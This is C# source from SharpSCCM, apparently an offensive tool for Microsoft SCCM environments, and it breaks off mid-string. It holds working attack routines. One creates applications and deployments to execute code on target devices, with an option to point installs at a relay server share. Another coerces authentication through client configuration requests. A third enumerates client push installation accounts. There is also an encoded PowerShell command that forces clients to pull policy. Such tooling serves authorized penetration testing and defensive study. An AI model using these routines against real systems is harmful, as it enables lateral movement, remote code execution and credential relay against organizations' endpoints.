using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Management;
using System.Threading;

namespace SharpSCCM
{
    public static class MgmtPointWmi
    {
        public static void Exec(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string applicationPath = null, string relayServer = null, string resourceId = null, bool runAsUser = true, string collectionType = null, string userName = null)
        {
            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
            // Create a collection is one is not specified
            if (collection == null)
            {
                if (!string.IsNullOrEmpty(resourceId))
                {
                    ManagementObject resource = GetDeviceOrUser(wmiConnection, resourceId: resourceId);
                    collectionType = resource.ClassPath.ClassName == "SMS_R_System" ? "device" : resource.ClassPath.ClassName == "SMS_R_User" ? "user" : null;
                }
                collectionType = !string.IsNullOrEmpty(collectionType) ? collectionType : !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : null;
                string newCollectionName = $"{char.ToUpper(collectionType[0]) + collectionType.Substring(1)}s_{Guid.NewGuid()}";
                collection = NewCollection(wmiConnection, collectionType, newCollectionName);
                NewCollectionMember(wmiConnection, newCollectionName, collectionType, (string)collection["CollectionID"], deviceName, userName, resourceId);
            }
            else
            {
                collectionType = !string.IsNullOrEmpty(collectionType) ? collectionType : (uint)collection["CollectionType"] == 2 ? "device" : (uint)collection["CollectionType"] == 1 ? "user" : null;
            }
            string newApplicationName = $"Application_{Guid.NewGuid()}";
            string newDeploymentName = $"{newApplicationName}_{(string)collection["CollectionID"]}_Install";
            applicationPath = !string.IsNullOrEmpty(relayServer) ? $"\\\\{relayServer}\\C$" : applicationPath;
            NewApplication(wmiConnection, newApplicationName, applicationPath, runAsUser, true);
            NewDeployment(wmiConnection, newApplicationName, null, (string)collection["CollectionID"]);
            Console.WriteLine("[+] Waiting for new deployment to become available...");
            bool deploymentAvailable = false;
            while (!deploymentAvailable)
            {
                Thread.Sleep(millisecondsTimeout: 5000);
                ManagementObjectCollection deployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", whereCondition: $"AssignmentName='{newDeploymentName}'");
                if (deployments.Count == 1)
                {
                    Console.WriteLine("[+] New deployment is available, waiting 30 seconds for updated policy to become available");
                    Thread.Sleep(millisecondsTimeout: 30000);
                    deploymentAvailable = true;
                }
                else
                {
                    Console.WriteLine("[+] New deployment is not available yet... trying again in 5 seconds");
                }
            }
            if (collectionType == "device")
            {
                UpdateMachinePolicy(wmiConnection, (string)collection["CollectionID"]);
                Console.WriteLine("[+] Waiting 1 minute for execution to complete...");
                Thread.Sleep(60000);
            }
            else if (collectionType == "user")
            {
                UpdateUserPolicy(wmiConnection, (string)collection["CollectionID"]);
            }
            Console.WriteLine("[+] Cleaning up");
            Cleanup.RemoveDeployment(wmiConnection, newDeploymentName);
            Cleanup.RemoveApplication(wmiConnection, newApplicationName);
            // Only delete the collection if not using an existing collection
            if (string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName))
            {
                Cleanup.RemoveCollection(wmiConnection, null, (string)collection["CollectionID"]);
            }
        }

        public static void InvokeLastLogonUpdate(ManagementScope wmiConnection, string collectionName)
        {
            // TODO
        }
        public static void GenerateCCR(string target, string server = null, string siteCode = null)
        {
            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(server, null, siteCode);
            Console.WriteLine($"[+] Generating a client configuration request (CCR) to coerce authentication to {target}");
            ManagementClass collectionClass = new ManagementClass(wmiConnection, new ManagementPath("SMS_Collection"), null);
            ManagementBaseObject generatorParams = collectionClass.GetMethodParameters("GenerateCCRByName");
            generatorParams.SetPropertyValue("Name", target);
            generatorParams.SetPropertyValue("PushSiteCode", siteCode);
            generatorParams.SetPropertyValue("Forced", false);
            collectionClass.InvokeMethod("GenerateCCRByName", generatorParams, null);
        }

        public static ManagementObject GetCollection(ManagementScope wmiConnection, string collectionName = null, string collectionId = null, bool printOutput = false)
        {
            ManagementObject collection = null;
            string whereCondition = !string.IsNullOrEmpty(collectionId) ? $"CollectionID='{collectionId}'" : $"Name='{collectionName}'";
            ManagementObjectCollection collections = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Collection", whereCondition: whereCondition);
            if (collections.Count > 1)
            {
                Console.WriteLine($"[!] Found {collections.Count} collections where {whereCondition}");
                Console.WriteLine("[!] Try using a CollectionID instead (-i)");
            }
            else if (collections.Count == 0)
            {
                Console.WriteLine($"[+] Found 0 collections matching the specified {(!string.IsNullOrEmpty(collectionId) ? "CollectionID" : !string.IsNullOrEmpty(collectionName) ? "Name" : null)}");
            }
            else
            {
                collection = collections.OfType<ManagementObject>().First();
                if (printOutput) Console.WriteLine($"[+] Found the {collection["Name"]} collection ({collection["CollectionID"]})");
            }
            return collection;
        }

        public static ManagementObjectCollection GetCollectionMembers(ManagementScope wmiConnection, string collectionName = null, string collectionId = null, bool count = false, string[] properties = null, string whereCondition = null, string orderByColumn = null, bool dryRun = false, bool verbose = false, bool printOutput = false)
        {
            ManagementObjectCollection collectionMembers = null;
            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId, printOutput);
            if (collection != null)
            {
                collectionMembers = MgmtUtil.GetClassInstances(wmiConnection, "SMS_FullCollectionMembership", null, count, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", null, dryRun, verbose, printOutput: printOutput);
                if (collectionMembers.Count == 0)
                {
                    if (printOutput) Console.WriteLine($"[+] Found 0 members in {collection["Name"]} ({collection["CollectionID"]})");
                }
            }
            return collectionMembers;
        }

        public static void GetCollectionRule(ManagementScope wmiConnection, string providedCollectionName, string providedCollectionId, string deviceName, string userName, string resourceId)
        {
            // Get collections that match the provided criteria
            ManagementObject providedCollection;
            if (!string.IsNullOrEmpty(providedCollectionName) || !string.IsNullOrEmpty(providedCollectionId))
            {
                providedCollection = GetCollection(wmiConnection, providedCollectionName, providedCollectionId, true);
                if (providedCollection != null)
                {
                    providedCollectionName = (string)providedCollection["Name"];
                    providedCollectionId = (string)providedCollection["CollectionID"];
                }
                else
                {
                    return;
                }
            }

            // Get devices and users that match the provided criteria
            ManagementObject providedDeviceOrUser = null;
            if (!string.IsNullOrEmpty(deviceName) || !string.IsNullOrEmpty(userName) || !string.IsNullOrEmpty(resourceId))
            {
                providedDeviceOrUser = GetDeviceOrUser(wmiConnection, deviceName, resourceId, userName, true);
                if (providedDeviceOrUser == null)
                {
                    return;
                }
            }

            // Get rules for all collections so they can be compared to the provided criteria
            ManagementObjectCollection existingCollections = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Collection");
            if (existingCollections.Count > 0)
            {
                bool foundMatchingRule = false;
                Console.WriteLine("[+] Searching for matching collection rules");

                // Loop through once to identify matching collections, again to compare those matches to all existing collections, then additional times as needed for nested rules
                int loopsCompleted = 0;
                int depth = 1;
                int matchingIncludeAndExcludeRules = 0;
                List<string> existingCollectionsMatchingProvidedResource = new List<string>();
                List<ManagementBaseObject> unprintedRules = new List<ManagementBaseObject>();
                while (loopsCompleted <= depth)
                {
                    foreach (ManagementObject existingCollection in existingCollections)
                    {
                        // Get the Name and CollectionID to for each collection
                        string existingCollectionName = (string)existingCollection["Name"];
                        string existingCollectionId = (string)existingCollection["CollectionID"];

                        // Get collection members that match the provided criteria
                        ManagementObjectCollection existingCollectionMembers;
                        if (providedDeviceOrUser != null)
                        {
                            existingCollectionMembers = GetCollectionMembers(wmiConnection, existingCollectionName, existingCollectionId);
                            foreach (ManagementObject existingCollectionMember in existingCollectionMembers)
                            {
                                if ((uint)existingCollectionMember["ResourceID"] == (uint)providedDeviceOrUser["ResourceID"])
                                {
                                    existingCollectionsMatchingProvidedResource.Add(existingCollectionId);
                                }
                            }
                        }

                        // Populate the CollectionRules lazy property
                        existingCollection.Get();
                        ManagementBaseObject[] collectionRules = (ManagementBaseObject[])existingCollection["CollectionRules"];

                        // Account for collections with no rules
                        if (collectionRules != null)
                        {
                            foreach (ManagementBaseObject collectionRule in collectionRules)
                            {
                                // Grab the query and fetch the results
                                if (collectionRule.Properties.Cast<PropertyData>().Any(property => property.Name == "QueryExpression"))
                                {
                                    string collectionRuleQuery = (string)collectionRule["QueryExpression"];
                                    ManagementObjectCollection collectionRuleQueryResults = MgmtUtil.GetClassInstances(wmiConnection, "Query Results", collectionRuleQuery);
                                    if (collectionRuleQueryResults.Count > 0)
                                    {
                                        // If only a collection Name or CollectionID is provided
                                        if ((((!string.IsNullOrEmpty(providedCollectionName) && providedCollectionName == existingCollectionName) ||
                                            (!string.IsNullOrEmpty(providedCollectionId) && providedCollectionId == existingCollectionId)) &&
                                            string.IsNullOrEmpty(deviceName) && string.IsNullOrEmpty(userName) && string.IsNullOrEmpty(resourceId)) ||
                                            // If this collection matches a provided or previously matched resource
                                            existingCollectionsMatchingProvidedResource.Contains(existingCollectionId))
                                        {
                                            // Add the ID of the collection containing the matching rule to the list of matches
                                            if (!existingCollectionsMatchingProvidedResource.Contains(existingCollectionId))
                                            {
                                                existingCollectionsMatchingProvidedResource.Add(existingCollectionId);
                                            }
                                            if (loopsCompleted == depth)
                                            {
                                                Console.WriteLine("-----------------------------------\n" +
                                                $"CollectionID: {existingCollectionId}\n" +
                                                $"Collection Name: {existingCollectionName}\n" +
                                                $"RuleName: {collectionRule["RuleName"]}\n" +
                                                $"QueryID: {collectionRule["QueryID"]}\n" +
                                                $"Query Expression: {collectionRule["QueryExpression"]}");
                                            }
                                        }
                                        foreach (ManagementObject collectionRuleQueryResult in collectionRuleQueryResults)
                                        {
                                            // If device Name, user UniqueUserName, or ResourceID provided, or if only a collection Name or CollectionID is provided, print matching or all collection rules, respectively
                                            try
                                            {
                                                // If device Name, user UniqueUserName, or ResourceID provided matches a query result
                                                if ((string)collectionRuleQueryResult.GetPropertyValue("Name") == deviceName ||
                                                   (string)collectionRuleQueryResult.GetPropertyValue("UniqueUserName") == userName ||
                                                   (uint)collectionRuleQueryResult.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId))
                                                {
                                                    foundMatchingRule = true;
                                                    // Add the matching rule to the list of matches
                                                    if (!unprintedRules.Contains(collectionRule))
                                                    {
                                                        unprintedRules.Add(collectionRule);
                                                    }
                                                    else if (loopsCompleted == depth)
                                                    {
                                                        Console.WriteLine("-----------------------------------\n" +
                                                        $"CollectionID: {existingCollectionId}\n" +
                                                        $"Collection Name: {existingCollectionName}\n" +
                                                        $"RuleName: {collectionRule["RuleName"]}\n" +
                                                        $"QueryID: {collectionRule["QueryID"]}\n" +
                                                        $"Query Expression:{collectionRule["QueryExpression"]}");
                                                    }
                                                }
                                            }
                                            catch (ManagementException)
                                            {
                                                // Keep going if the property isn't found because it doesn't exist in both SMS_R_System and SMS_R_User
                                            }
                                        }
                                    }
                                    // Account for collection rules with queries that return no objects
                                    else if (((!string.IsNullOrEmpty(providedCollectionName) && providedCollectionName == existingCollectionName) ||
                                            (!string.IsNullOrEmpty(providedCollectionId) && providedCollectionId == existingCollectionId)) &&
                                            string.IsNullOrEmpty(deviceName) && string.IsNullOrEmpty(userName) && string.IsNullOrEmpty(resourceId))
                                    {
                                        foundMatchingRule = true;
                                        // Add the ID of the collection containing the matching rule to the list of matches
                                        if (!existingCollectionsMatchingProvidedResource.Contains(existingCollectionId))
                                        {
                                            existingCollectionsMatchingProvidedResource.Add(existingCollectionId);
                                        }
                                        if (loopsCompleted == depth)
                                        {
                                            Console.WriteLine("-----------------------------------\n" +
                                            $"CollectionID: {existingCollectionId}\n" +
                                            $"Collection Name: {existingCollectionName}\n" +
                                            $"RuleName: {collectionRule["RuleName"]}\n" +
                                            $"QueryID: {collectionRule["QueryID"]}\n" +
                                            $"Query Expression:{collectionRule["QueryExpression"]}");
                                        }
                                    }
                                }
                                else if (collectionRule.Properties.Cast<PropertyData>().Any(property => property.Name == "ExcludeCollectionID"))
                                {

                                    string collectionRuleExcludedCollectionId = (string)collectionRule["ExcludeCollectionID"];

                                    if (
                                        // If a collection Name or CollectionID is provided, print all collection rules
                                        existingCollectionId == providedCollectionId ||
                                        // If the collection nested in this collection matches the provided collection
                                        collectionRuleExcludedCollectionId == providedCollectionId ||
                                        // If this collection was previously matched because it was included in or excluded from another collection
                                        existingCollectionsMatchingProvidedResource.Contains(existingCollectionId) ||
                                        // If the collection nested in this collection was previously matched because it was included in or excluded from another collection
                                        existingCollectionsMatchingProvidedResource.Contains(collectionRuleExcludedCollectionId)
                                       )
                                    {
                                        foundMatchingRule = true;
                                        // Add the excluded collection ID to the list of matches if it's not already present
                                        if (!existingCollectionsMatchingProvidedResource.Contains(collectionRuleExcludedCollectionId))
                                        {
                                            existingCollectionsMatchingProvidedResource.Add(collectionRuleExcludedCollectionId);
                                            matchingIncludeAndExcludeRules++;
                                        }
                                        if (loopsCompleted == depth)
                                        {
                                            Console.WriteLine("-----------------------------------\n" +
                                            $"CollectionID: {existingCollectionId}\n" +
                                            $"Collection Name: {existingCollectionName}\n" +
                                            $"RuleName: {collectionRule["RuleName"]}\n" +
                                            $"ExcludeCollectionID: {collectionRule["ExcludeCollectionID"]}");
                                        }
                                    }
                                }
                                else if (collectionRule.Properties.Cast<PropertyData>().Any(property => property.Name == "IncludeCollectionID"))
                                {
                                    string collectionRuleIncludedCollectionId = (string)collectionRule["IncludeCollectionID"];
                                    if (
                                        // If a collection Name or CollectionID is provided, print all collection rules
                                        existingCollectionId == providedCollectionId || 
                                        // If the collection nested in this collection matches the provided collection
                                        collectionRuleIncludedCollectionId == providedCollectionId ||
                                        // If this collection was previously matched because it was included in or excluded from another collection
                                        existingCollectionsMatchingProvidedResource.Contains(existingCollectionId) ||
                                        // If the collection nested in this collection was previously matched because it was included in or excluded from another collection
                                        existingCollectionsMatchingProvidedResource.Contains(collectionRuleIncludedCollectionId)
                                       )
                                    {
                                        foundMatchingRule = true;
                                        // Add the included collection ID to the list of matches if it's not already present
                                        if (!existingCollectionsMatchingProvidedResource.Contains(collectionRuleIncludedCollectionId))
                                        {
                                            existingCollectionsMatchingProvidedResource.Add(collectionRuleIncludedCollectionId);
                                            matchingIncludeAndExcludeRules++;
                                        }
                                        if (loopsCompleted == depth)
                                        {
                                            Console.WriteLine("-----------------------------------\n" +
                                            $"CollectionID: {existingCollectionId}\n" +
                                            $"Collection Name: {existingCollectionName}\n" +
                                            $"RuleName: {collectionRule["RuleName"]}\n" +
                                            $"IncludeCollectionID: {collectionRule["IncludeCollectionID"]}");
                                        }

                                    }
                                }
                                else if (collectionRule.Properties.Cast<PropertyData>().Any(property => property.Name == "ResourceID"))
                                {
                                    // If only a collection Name or CollectionID is provided
                                    if ((((!string.IsNullOrEmpty(providedCollectionName) && providedCollectionName == existingCollectionName) || 
                                        (!string.IsNullOrEmpty(providedCollectionId) && providedCollectionId == existingCollectionId)) && 
                                        string.IsNullOrEmpty(deviceName) && string.IsNullOrEmpty(userName) && string.IsNullOrEmpty(resourceId)) ||
                                        // If this collection matches a provided or previously matched resource
                                        existingCollectionsMatchingProvidedResource.Contains(existingCollectionId) ||
                                        // If device Name, user UniqueUserName, or ResourceID provided
                                        (uint)collectionRule.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId) ||
                                        (string)collectionRule.GetPropertyValue("RuleName") == deviceName ||
                                        (string)collectionRule.GetPropertyValue("RuleName") == userName)
                                    {
                                        foundMatchingRule = true;
                                        // Add the collection ID to the list of matches if it's not already present
                                        if (!existingCollectionsMatchingProvidedResource.Contains(existingCollectionId))
                                        {
                                            existingCollectionsMatchingProvidedResource.Add(existingCollectionId);
                                        }
                                        if (loopsCompleted == depth)
                                        {
                                            Console.WriteLine("-----------------------------------\n" +
                                            $"CollectionID: {existingCollectionId}\n" +
                                            $"Collection Name: {existingCollectionName}\n" +
                                            $"RuleName: {collectionRule[propertyName: "RuleName"]}\n" +
                                            $"ResourceClassName: {collectionRule["ResourceClassName"]}\n" +
                                            $"ResourceID: {collectionRule["ResourceID"]}");
                                        }
                                    }
                                }
                            }
                        }
                    }
                    // Increase depth of search if any include or exclude rules were found
                    if (matchingIncludeAndExcludeRules > 0)
                    {
                        depth++;
                        Console.WriteLine($"[+] Found {matchingIncludeAndExcludeRules} matching collection rule{(matchingIncludeAndExcludeRules > 1 ? "s" : null)} at depth {depth} that reference{(matchingIncludeAndExcludeRules == 1 ? "s" : null)} other collections");
                        Console.WriteLine($"[+] Increasing search depth to {depth + 1} and looping through collection rules again to resolve any nested rules");
                        matchingIncludeAndExcludeRules = 0;
                    }
                    int loopsRemaining = depth - loopsCompleted;
                    if (loopsRemaining > 0)
                    {
                        Console.WriteLine($"[+] {loopsRemaining} loop{(loopsRemaining > 1 ? "s" : null)} remaining");
                    }
                    loopsCompleted++;
                }
                if (foundMatchingRule)
                {
                    Console.WriteLine(value: "-----------------------------------");
                }
                else
                {
                    Console.WriteLine("[+] Found 0 matching collection membership rules");
                }
            }
        }

        public static ManagementObjectCollection GetPrimaryDeviceForUser(ManagementScope wmiConnection, string resourceId = null, string userName = null)
        {
            userName = !string.IsNullOrEmpty(resourceId) ? (string)GetDeviceOrUser(wmiConnection, resourceId: resourceId)["UniqueUserName"] : userName;
            // Escape backslash for WQL query
            string whereCondition = $"UniqueUserName='{userName.Replace("\\", "\\\\")}'";
            // Get the device associated with the user
            ManagementObjectCollection userDevices = MgmtUtil.GetClassInstances(wmiConnection, "SMS_UserMachineRelationship", whereCondition: whereCondition);
            if (userDevices.Count == 1)
            {
                Console.WriteLine($"[+] {userName} is the primary user of {userDevices.OfType<ManagementObject>().First()["ResourceName"]}");
            }
            else if (userDevices.Count > 1)
            {
                Console.WriteLine($"[!] Found multiple devices where {userName} is the primary user:\n");
                foreach (ManagementObject userDevice in userDevices)
                {
                    Console.WriteLine($"    {userDevice["ResourceName"]}");
                }
                Console.WriteLine();
                Console.WriteLine("[!] Try again using the device Name (-d) or ResourceID (-r)");
            }
            else
            {
                Console.WriteLine($"[!] Could not find any devices where {userName} is the primary user");
            }
            return userDevices;
        }

        public static ManagementObject GetDeviceOrUserFromResourceId(ManagementScope wmiConnection, string resourceId)
        {
            ManagementObject resource = null;
            string[] classes = { "SMS_R_System", "SMS_R_User" };
            foreach (string className in classes)
            {
                ManagementObjectCollection matchingResources = MgmtUtil.GetClassInstances(wmiConnection, className, whereCondition: $"ResourceID='{resourceId}'");
                if (matchingResources.Count == 1)
                {
                    resource = matchingResources.OfType<ManagementObject>().First();
                    Console.WriteLine($"[+] Found resource named {resource["Name"]} with ResourceID {resource["ResourceID"]}");
                    break;
                }
                else
                {
                    Console.WriteLine($"[+] Found 0 devices or users with ResourceID {resourceId} in {className}");
                }
            }
            return resource;
        }

        public static ManagementObject GetDeviceOrUser(ManagementScope wmiConnection, string deviceName = null, string resourceId = null, string userName = null, bool printOutput = false)
        {
            // Escape backslashes (e.g., "DOMAIN\username") for WQL
            userName = !string.IsNullOrEmpty(userName) ? Helpers.EscapeBackslashes(userName) : null;
            
            ManagementObject resource = null;
            string[] classes = { "SMS_R_System", "SMS_R_User" };
            string whereCondition = !string.IsNullOrEmpty(resourceId) ? $"ResourceID='{resourceId}'" : !string.IsNullOrEmpty(deviceName) ? $"Name='{deviceName}'" : !string.IsNullOrEmpty(userName) ? $"UniqueUserName='{userName}'" : null;         
            foreach (string className in classes)
            {
                // Skip searches for devices in the users class and vice versa
                if ((className == "SMS_R_System" && string.IsNullOrEmpty(userName)) ||
                    (className == "SMS_R_User" && string.IsNullOrEmpty(deviceName)))
                {
                    ManagementObjectCollection matchingResources = MgmtUtil.GetClassInstances(wmiConnection, className, whereCondition: whereCondition);
                    if (matchingResources.Count == 1)
                    {
                        resource = matchingResources.OfType<ManagementObject>().First();
                        if (printOutput) Console.WriteLine($"[+] Found resource named {resource["Name"]} with ResourceID {resource["ResourceID"]}");
                        break;
                    }
                    else
                    {
                        if (printOutput) Console.WriteLine($"[+] Found 0 matching {(className == "SMS_R_System" ? "devices" : "users")} in {className}");
                    }
                }
            }
            return resource;
        }

        public static void GetSitePushSettings(ManagementScope wmiConnection = null)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery($"SELECT PropertyName, Value, Value1 FROM SMS_SCI_SCProperty WHERE ItemType='SMS_DISCOVERY_DATA_MANAGER' AND (PropertyName='ENABLEKERBEROSCHECK' OR PropertyName='FILTERS' OR PropertyName='SETTINGS')"));
            try
            {
                ManagementObjectCollection results = searcher.Get();
                if (results.Count > 0)
                {
                    foreach (ManagementObject result in results)
                    {
                        if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() == "Active")
                        {
                            Console.WriteLine("[+] Automatic site-wide client push installation is enabled");
                        }
                        else if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() != "Active")
                        {
                            Console.WriteLine("[+] Automatic site-wide client push installation is not enabled");
                        }
                        else if (result["PropertyName"].ToString() == "ENABLEKERBEROSCHECK" && result["Value"].ToString() == "3")
                        {
                            Console.WriteLine("[+] Fallback to NTLM is enabled");
                        }
                        else if (result["PropertyName"].ToString() == "FILTERS")
                        {
                            Console.WriteLine("[+] Install client software on the following computers:");
                            if (result["Value"].ToString() == "0")
                            {
                                Console.WriteLine("      Workstations and Servers (including domain controllers)");
                            }
                            else if (result["Value"].ToString() == "1")
                            {
                                Console.WriteLine("      Servers only (including domain controllers)");
                            }
                            else if (result["Value"].ToString() == "2")
                            {
                                Console.WriteLine("      Workstations and Servers (excluding domain controllers)");
                            }
                            else if (result["Value"].ToString() == "3")
                            {
                                Console.WriteLine("      Servers only (excluding domain controllers)");
                            }
                            else if (result["Value"].ToString() == "4")
                            {
                                Console.WriteLine("      Workstations and domain controllers only (excluding other servers)");
                            }
                            else if (result["Value"].ToString() == "5")
                            {
                                Console.WriteLine("      Domain controllers only");
                            }
                            else if (result["Value"].ToString() == "6")
                            {
                                Console.WriteLine("      Workstations only");
                            }
                            else if (result["Value"].ToString() == "7")
                            {
                                Console.WriteLine("      No computers");
                            }
                        }
                    }
                    searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT Values FROM SMS_SCI_SCPropertyList WHERE PropertyListName='Reserved2'"));
                    results = searcher.Get();
                    foreach (ManagementObject result in results)
                    {
                        if (result["Values"] != null)
                        {
                            foreach (string value in (string[])result["Values"])
                            {
                                Console.WriteLine($"[+] Discovered client push installation account: {value}");

                            }
                        }
                        else
                        {
                            Console.WriteLine("[+] No client push installation accounts were configured, but the server may still use its machine account");
                        }
                    }
                    searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM SMS_SCI_SQLTask WHERE ItemName='Clear Undiscovered Clients'"));
                    results = searcher.Get();
                    foreach (ManagementObject result in results)
                    {
                        if (result["Enabled"].ToString() == "True")
                        {
                            Console.WriteLine($"[+] The client installed flag is automatically cleared on inactive clients after {result["DeleteOlderThan"]} days, resulting in reinstallation if automatic site-wide client push installation is enabled");
                        }
                        else
                        {
                            Console.WriteLine("[+] The client installed flag is not automatically cleared on inactive clients, preventing automatic reinstallation");
                        }
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine($"[!] You do not have the necessary permissions to query the WMI provider: {ex.Message}");
            }
            catch (ManagementException ex)
            {
                Console.WriteLine($"[!] An exception occurred while querying for WMI data: {ex.Message}");
            }
        }

        public static void UpdateMachinePolicy(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string resourceId = null, string userName = null)
        {
            string collectionType = null;
            ManagementObject collection = null;
            if (!string.IsNullOrEmpty(collectionId) || !string.IsNullOrEmpty(collectionName))
            {
                collection = GetCollection(wmiConnection, collectionName, collectionId);
            }
            // Create a collection is one is not specified
            if (collection == null)
            {
                if (!string.IsNullOrEmpty(resourceId))
                {
                    ManagementObject resource = GetDeviceOrUser(wmiConnection, resourceId: resourceId);
                    collectionType = resource.ClassPath.ClassName == "SMS_R_System" ? "device" : resource.ClassPath.ClassName == "SMS_R_User" ? "user" : null;
                }
                collectionType = !string.IsNullOrEmpty(collectionType) ? collectionType : !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : null;
                string newCollectionName = $"{char.ToUpper(collectionType[0]) + collectionType.Substring(1)}s_{Guid.NewGuid()}";
                collection = NewCollection(wmiConnection, collectionType, newCollectionName);
                NewCollectionMember(wmiConnection, newCollectionName, collectionType, (string)collection["CollectionID"], deviceName, userName, resourceId);
            }
            else
            {
                collectionType = (uint)collection["CollectionType"] == 2 ? "device" : (uint)collection["CollectionType"] == 1 ? "user" : null;
            }
            ManagementClass clientOperation = new ManagementClass(wmiConnection, new ManagementPath("SMS_ClientOperation"), null);
            ManagementBaseObject initiateClientOpParams = clientOperation.GetMethodParameters("InitiateClientOperation");
            initiateClientOpParams.SetPropertyValue("Type", 8); // RequestPolicyNow

            Console.WriteLine($"[+] Forcing all members of {collection["Name"]} ({collection["CollectionID"]}) to retrieve machine policy and execute any new applications available");
            try
            {
                initiateClientOpParams[propertyName: "TargetCollectionID"] = collection["CollectionID"];
                clientOperation.InvokeMethod("InitiateClientOperation", initiateClientOpParams, null);
            }
            catch (ManagementException ex)
            {
                Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                Console.WriteLine("[!] Is your account assigned the correct security role?");
            }
        }

        public static void UpdateUserPolicy(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string resourceId = null, string userName = null)
        {
            if (!string.IsNullOrEmpty(collectionId) || !string.IsNullOrEmpty(collectionName))
            {
                ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
                if (collection != null)
                {
                    ManagementObjectCollection collectionMembers = GetCollectionMembers(wmiConnection, collectionName, collectionId);
                    if (collectionMembers.Count > 0)
                    {
                        // Run policy retrieval and evaluation cycle on device collections
                        if ((uint)collection["CollectionType"] == 2)
                        {
                            Console.WriteLine($"[+] Forcing all members of {collection["Name"]} ({collection["CollectionID"]}) to retrieve user policy and execute any new applications available");
                            // $CurrentUser = Get-WmiObject -Query "SELECT UserSID, LogoffTime FROM CCM_UserLogonEvents WHERE LogoffTime=NULL" -Namespace "root\ccm"; $UserID=$CurrentUser.UserSID; $UserID=$UserID.replace("-", "_"); $MessageIDs = "{00000000-0000-0000-0000-000000000026}","{00000000-0000-0000-0000-000000000027}"; ForEach ($MessageID in $MessageIDs) { $ScheduledMessage = ([wmi]"root\ccm\Policy\$UserID\ActualConfig:CCM_Scheduler_ScheduledMessage.ScheduledMessageID=$MessageID"); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=1;MaxRandomDelayMinutes=0"); $ScheduledMessage.TargetEndpoint = "direct:PolicyAgent_RequestAssignments"; $ScheduledMessage.Put(); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=15;MaxRandomDelayMinutes=0"); sleep 30; $ScheduledMessage.Put()}
                            string commandToExecute = "powershell -EncodedCommand JABDAHUAcgByAGUAbgB0AFUAcwBlAHIAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgAFUAcwBlAHIAUwBJAEQALAAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAIABGAFIATwBNACAAQwBDAE0AXwBVAHMAZQByAEwAbwBnAG8AbgBFAHYAZQBuAHQAcwAgAFcASABFAFIARQAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAPQBOAFUATABMACIAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAIgByAG8AbwB0AFwAYwBjAG0AIgA7ACAAJABVAHMAZQByAEkARAA9ACQAQwB1AHIAcgBlAG4AdABVAHMAZQByAC4AVQBzAGUAcgBTAEkARAA7ACAAJABVAHMAZQByAEkARAA9ACQAVQBzAGUAcgBJAEQALgByAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAXwAiACkAOwAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwAgAD0AIAAiAHsAMAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAyADYAfQAiACwAIgB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAAMgA3AH0AIgA7ACAARgBvAHIARQBhAGMAaAAgACgAJABNAGUAcwBzAGEAZwBlAEkARAAgAGkAbgAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwApACAAewAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAgAD0AIAAoAFsAdwBtAGkAXQAiAHIAbwBvAHQAXABjAGMAbQBcAFAAbwBsAGkAYwB5AFwAJABVAHMAZQByAEkARABcAEEAYwB0AHUAYQBsAEMAbwBuAGYAaQBnADoAQwBDAE0AXwBTAGMAaABlAGQAdQBsAGUAcgBfAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAEkARAA9ACQATQBlAHMAcwBhAGcAZQBJAEQAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAHIAaQBnAGcAZQByAHMAIAA9ACAAQAAoACIAUwBpAG0AcABsAGUASQBuAHQAZQByAHYAYQBsADsATQBpAG4AdQB0AGUAcwA9ADEAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAGEAcgBnAGUAdABFAG4AZABwAG8AaQBuAHQAIAA9ACAAIgBkAGkAcgBlAGMAdAA6AFAAbwBsAGkAYwB5AEEAZwBl